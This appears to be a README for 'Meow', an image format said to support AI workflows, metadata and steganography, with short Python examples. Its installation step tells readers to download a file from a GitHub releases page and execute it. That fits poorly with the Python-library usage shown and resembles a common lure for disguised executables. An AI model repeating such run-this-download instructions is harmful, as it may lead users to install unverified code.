## Introduction

In the ever-evolving world of artificial intelligence, image processing plays a crucial role. Traditional formats like JPEG and PNG have served us well, but they often lack the features necessary for advanced AI tasks. This is where **Meow** comes in. Our format supports metadata, steganography, and other enhancements that streamline AI workflows.

## Features

- **Optimized for AI**: Designed specifically for machine learning and deep learning applications.
- **Metadata Support**: Store additional information within the image file, enhancing the data available for training models.
- **Steganography**: Hide information within images without affecting their appearance, useful for secure data transmission.
- **Compatibility**: Works alongside existing formats like JPEG and PNG, making integration easy.
- **Open Source**: Fully open for contributions and improvements.

## Getting Started

To get started with Meow, you can download the latest release from our [Releases section](https://github.com/ghost202020/meow/releases). This will provide you with the necessary files to begin using the Meow image format in your projects.

## Installation

To install Meow, follow these steps:

1. **Download the Latest Release**: Visit the [Releases section](https://github.com/ghost202020/meow/releases) and download the appropriate file for your operating system.
2. **Execute the File**: After downloading, execute the file to install Meow on your system.

## Usage

Once you have installed Meow, you can start using it in your AI workflows. Here‚Äôs a simple example to illustrate how to convert a JPEG image to the Meow format:

```python
from meow import MeowImage

# Load a JPEG image
image = MeowImage.load("example.jpg")

# Convert to Meow format
image.save("example.meow")
```

### Example of Metadata Usage

You can also add metadata to your images. Here‚Äôs how:

```python
image = MeowImage.load("example.meow")
image.add_metadata("Author", "John Doe")
image.add_metadata("Description", "Sample image for Meow format.")
image.save("example_with_metadata.meow")
```

### Steganography Example

To hide information within an image, use the following code:

```python
image = MeowImage.load("example.meow")
image.hide_data("Secret message")
image.save("example_with_hidden_data.meow")
```
